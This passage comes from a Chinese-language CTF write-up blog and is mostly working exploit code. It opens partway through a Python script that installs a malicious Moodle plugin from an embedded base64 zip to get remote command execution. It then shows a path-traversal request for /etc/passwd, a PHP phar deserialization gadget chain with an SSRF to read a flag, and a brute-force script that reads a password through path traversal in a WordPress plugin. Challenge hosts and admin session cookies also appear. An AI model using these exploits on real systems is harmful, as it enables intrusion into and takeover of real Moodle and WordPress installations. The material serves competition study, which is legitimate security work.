<span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;areamaxbytes&quot;</span> : <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ctx_id&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;savepath&quot;</span> : <span class="string">&quot;/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zip_b64 = <span class="string">&#x27;UEsDBAoAAAAAAOVa0VAAAAAAAAAAAAAAAAAEAAAAcmNlL1BLAwQKAAAAAACATtFQAAAAAAAAAAAAAAAACQAAAHJjZS9sYW5nL1BLAwQKAAAAAAB2bdFQAAAAAAAAAAAAAAAADAAAAHJjZS9sYW5nL2VuL1BLAwQUAAAACAD4W9FQA9MUliAAAAAeAAAAGQAAAHJjZS9sYW5nL2VuL2Jsb2NrX3JjZS5waHCzsS/IKFAoriwuSc3VUIl3dw2JVk/OTVGP1bRWsLcDAFBLAwQUAAAACAB6bdFQtXxvb0EAAABJAAAADwAAAHJjZS92ZXJzaW9uLnBocLOxL8goUODlUinIKU3PzNO1K0stKs7Mz1OwVTAyMDIwMDM0NzCwRpJPzs8tyM9LzSsBqlBPyslPzo4vSk5VtwYAUEsBAh8ACgAAAAAA5VrRUAAAAAAAAAAAAAAAAAQAJAAAAAAAAAAQAAAAAAAAAHJjZS8KACAAAAAAAAEAGAB/2bACX0TWAWRC9B9fRNYBhvTzH19E1gFQSwECHwAKAAAAAACATtFQAAAAAAAAAAAAAAAACQAkAAAAAAAAABAAAAAiAAAAcmNlL2xhbmcvCgAgAAAAAAABABgArE3mRVJE1gGOG/QfX0TWAYb08x9fRNYBUEsBAh8ACgAAAAAAdm3RUAAAAAAAAAAAAAAAAAwAJAAAAAAAAAAQAAAASQAAAHJjZS9sYW5nL2VuLwoAIAAAAAAAAQAYAMIcIaZyRNYBwhwhpnJE1gGOG/QfX0TWAVBLAQIfABQAAAAIAPhb0VAD0xSWIAAAAB4AAAAZACQAAAAAAAAAIAAAAHMAAAByY2UvbGFuZy9lbi9ibG9ja19yY2UucGhwCgAgAAAAAAABABgA1t0sN2BE1gHW3Sw3YETWAfYt6i9fRNYBUEsBAh8AFAAAAAgAem3RULV8b29BAAAASQAAAA8AJAAAAAAAAAAgAAAAygAAAHJjZS92ZXJzaW9uLnBocAoAIAAAAAAAAQAYAO6e2qlyRNYB7p7aqXJE1gFkQvQfX0TWAVBLBQYAAAAABQAFANsBAAA4AQAAAAA=&#x27;</span></span><br><span class="line">    zip_file_bytes = zip_b64.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    zip_file_b64 = base64.decodebytes(zip_file_bytes)</span><br><span class="line"></span><br><span class="line">    data_file = [</span><br><span class="line">        (<span class="string">&#x27;repo_upload_file&#x27;</span>,</span><br><span class="line">            (<span class="string">&#x27;rce.zip&#x27;</span>, zip_file_b64, <span class="string">&#x27;application/zip&#x27;</span>))]</span><br><span class="line"></span><br><span class="line">    r = session.post(url + <span class="string">&#x27;/repository/repository_ajax.php&#x27;</span>, params=data_get, data=data_post, files=data_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;rce.zip&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        p7.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">        <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nError uploading zip file.\n&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Trying to load file</span></span><br><span class="line">    data_post = &#123;</span><br><span class="line">        <span class="string">&quot;sesskey&quot;</span> : sess_key,</span><br><span class="line">        <span class="string">&quot;_qf__tool_installaddon_installfromzip_form&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mform_showmore_id_general&quot;</span> : <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mform_isexpanded_id_general&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;zipfile&quot;</span> : zipfile_id,</span><br><span class="line">        <span class="string">&quot;plugintype&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;rootdir&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submitbutton&quot;</span> : <span class="string">&quot;Install plugin from the ZIP file&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = session.post(url + <span class="string">&#x27;/admin/tool/installaddon/index.php&#x27;</span>, data=data_post)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Validation successful, installation can continue&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        p7.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">        <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nError uploading zip file, problems on plugin install.\n&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Confirm load</span></span><br><span class="line">    zip_storage = re.findall(<span class="string">r&#x27;installzipstorage=(.*?)&amp;&#x27;</span>, r.url)[<span class="number">0</span>]</span><br><span class="line">    data_post = &#123;</span><br><span class="line">        <span class="string">&quot;installzipcomponent&quot;</span> : <span class="string">&quot;block_rce&quot;</span>,</span><br><span class="line">        <span class="string">&quot;installzipstorage&quot;</span> : zip_storage,</span><br><span class="line">        <span class="string">&quot;installzipconfirm&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sesskey&quot;</span> : sess_key</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = session.post(url + <span class="string">&#x27;/admin/tool/installaddon/index.php&#x27;</span>, data=data_post)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Current release information&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        p7.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">        <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nError uploading zip file, confirmation problems.\n&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p7.success(Color.YELLOW + <span class="string">&quot;✓&quot;</span> + Color.END)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">moodle_RCE</span>(<span class="params">url, command</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Remote Command Execution on system with plugin installed (malicious zip file)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    p8 = log.progress(<span class="string">&quot;Executing &quot;</span> + Color.BLUE + command + Color.END)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    data_get = &#123;<span class="string">&quot;cmd&quot;</span> : command&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = session.get(url + <span class="string">&#x27;/blocks/rce/lang/en/block_rce.php&#x27;</span>, params=data_get, timeout=<span class="number">3</span>)</span><br><span class="line">        p8.success(Color.YELLOW + <span class="string">&quot;✓&quot;</span> + Color.END)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + Color.YELLOW + r.text + Color.END)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout <span class="keyword">as</span> e:</span><br><span class="line">        p8.success(Color.YELLOW + <span class="string">&quot;✓&quot;</span> + Color.END)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[&quot;</span> + Color.YELLOW + <span class="string">&quot;+&quot;</span> + Color.END + <span class="string">&quot;]&quot;</span> + Color.GREEN + <span class="string">&quot; Keep breaking ev3rYthiNg!!\n&quot;</span> + Color.END)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = arguments()</span><br><span class="line">    session, id_user, sess_key = login(args.url, args.username, args.password, args.id_course, args.teacher_cookie)</span><br><span class="line">    enrol2rce(session, args.url, args.id_manager, args.username, args.id_course, args.teacher_cookie, args.command)</span><br></pre></td></tr></table></figure>

<h1 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h1><p>首先有一个<code>shofile</code>,来拿源码</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/showfile.php?f=../demo/../../../../../../../etc/passwd</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">47.104</span><span class="number">.95</span><span class="number">.124</span><span class="string">:8080</span></span><br><span class="line"><span class="attr">Pragma:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/103.0.0.0</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure>

<p>通过文件上传过程来绕过那个session，然后再phar吧</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/upload.php</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">47.104</span><span class="number">.95</span><span class="number">.124</span><span class="string">:8080</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">19046</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">PHPSESSID=111111dem0</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Origin:</span> <span class="literal">null</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">multipart/form-data;</span> <span class="string">boundary=----WebKitFormBoundaryqe6DjUlcWopoQAXk</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/103.0.0.0</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"></span><br><span class="line"><span class="string">------WebKitFormBoundaryqe6DjUlcWopoQAXk</span></span><br><span class="line"><span class="attr">Content-Disposition:</span> <span class="string">form-data;</span> <span class="string">name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">zzzz</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryqe6DjUlcWopoQAXk</span></span><br><span class="line"><span class="attr">Content-Disposition:</span> <span class="string">form-data;</span> <span class="string">name=&quot;file&quot;;</span> <span class="string">filename=&quot;QQ&amp;#25130;&amp;#22270;20220730091423.jpg&quot;</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">image/jpeg</span></span><br><span class="line"></span><br><span class="line"><span class="string">ÿØÿà</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构造反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">session_id</span>().<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>])[<span class="number">0</span>].<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file[<span class="string">&quot;tmp_name&quot;</span>],<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload  &#x27;</span>.<span class="string">&quot;./&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">e</span>(<span class="variable">$filename</span>).<span class="string">&#x27; success!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">do_upload</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filesize-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid file!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;file-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;contents);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">0</span>]-&gt;source;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">1</span>]-&gt;schema;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 访问不存在的属性也会出现这个问题</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/usr|auto|log/i&#x27;</span> , <span class="variable">$this</span>-&gt;source))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;schema !== <span class="string">&#x27;file:///var/www/html/&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;source !== <span class="string">&#x27;admin.png&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&#x27;admin.png&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$guest1</span> = <span class="keyword">new</span> <span class="title class_">GuestShow</span>();</span><br><span class="line"><span class="variable">$guest2</span> = <span class="keyword">new</span> <span class="title class_">GuestShow</span>();</span><br><span class="line"><span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$upload1</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$upload2</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">AdminShow</span>();</span><br><span class="line"><span class="variable">$admin1</span> = <span class="keyword">new</span> <span class="title class_">AdminShow</span>();</span><br><span class="line"><span class="variable">$guest1</span>-&gt;file = <span class="variable">$upload</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;tmp = <span class="variable">$admin</span>;</span><br><span class="line"><span class="variable">$admin</span>-&gt;str[<span class="number">0</span>] = <span class="variable">$upload1</span>;</span><br><span class="line"><span class="variable">$admin</span>-&gt;str[<span class="number">1</span>] = <span class="variable">$upload2</span>;</span><br><span class="line"><span class="variable">$upload1</span>-&gt;filesize = <span class="variable">$admin1</span>;</span><br><span class="line"><span class="variable">$upload1</span>-&gt;date=<span class="string">&quot;http://10.10.10.10?url=file:///flag&quot;</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;filesize = <span class="variable">$admin1</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;date = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;tmp = <span class="variable">$guest2</span>;</span><br><span class="line"><span class="variable">$guest2</span>-&gt;file = <span class="variable">$admin1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;dem0.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$guest1</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​                 <img src="https://docimg5.docs.qq.com/image/agsTbkxlN0hwvJZaVK21Lg.png?w=1280&h=622.4657534246575" alt="img">        </p>
<p>这个直接curl的时候使用<code>file:///flag</code>不就行了?</p>
<h1 id="RCEFILE"><a href="#RCEFILE" class="headerlink" title="RCEFILE"></a>RCEFILE</h1><p>原题：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html">https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html</a></p>
<h1 id="WP-UM"><a href="#WP-UM" class="headerlink" title="WP-UM"></a>WP-UM</h1><p>​                 <img src="https://docimg1.docs.qq.com/image/hYRa0QDzx7DiQBfx1rZmzg.png?w=1244&h=292" alt="img">        </p>
<p>首先我们是有源码的,然后自己在本地登录上去,看看是否有插件可以利用,然后就找到了一个可以判断文件存在的payload.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">a=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">paramsPost = &#123;<span class="string">&quot;field_id&quot;</span>:<span class="string">&quot;um_field_2&quot;</span>,<span class="string">&quot;is_ajax&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;form_key&quot;</span>:<span class="string">&quot;upload&quot;</span>,<span class="string">&quot;filepath&quot;</span>:<span class="string">&quot;/../../../../../password/1M&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;um_show_uploaded_file&quot;</span>,<span class="string">&quot;pf_nonce&quot;</span>:<span class="string">&quot;0296b70753&quot;</span>,<span class="string">&quot;field_name&quot;</span>:<span class="string">&quot;upload&quot;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;Origin&quot;</span>:<span class="string">&quot;http://eci-2ze4dm8xhkfttv7n5leh.cloudeci1.ichunqiu.com&quot;</span>,<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://eci-2ze4dm8xhkfttv7n5leh.cloudeci1.ichunqiu.com/index.php/upload/&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;wordpress_0494c5c8dfe24eaa9fac863bece1c2e1&quot;</span>:<span class="string">&quot;admin%7C1660410192%7Cb8a1gd4uRfLmA0m5X8Ckgf3EpWbMhCuC8EOmord71Xk%7C1c929f7d11f67bfe0a1c00a9791156e7bcec1bb1f47b1ea4499a4192498941be&quot;</span>,<span class="string">&quot;wordpress_logged_in_0494c5c8dfe24eaa9fac863bece1c2e1&quot;</span>:<span class="string">&quot;admin%7C1660410192%7Cb8a1gd4uRfLmA0m5X8Ckgf3EpWbMhCuC8EOmord71Xk%7C554c711e186c04b417fd1e6769a1fae29140b7d1c1479895e7a6c72471cbbf8f&quot;</span>,<span class="string">&quot;chkphone&quot;</span>:<span class="string">&quot;acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O&quot;</span>,<span class="string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;</span>:<span class="string">&quot;1658664731,1658900148&quot;</span>&#125;</span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> a:</span><br><span class="line">        tmp = <span class="string">&quot;/../../../../../password/&quot;</span> + <span class="built_in">str</span>(x)+y</span><br><span class="line">        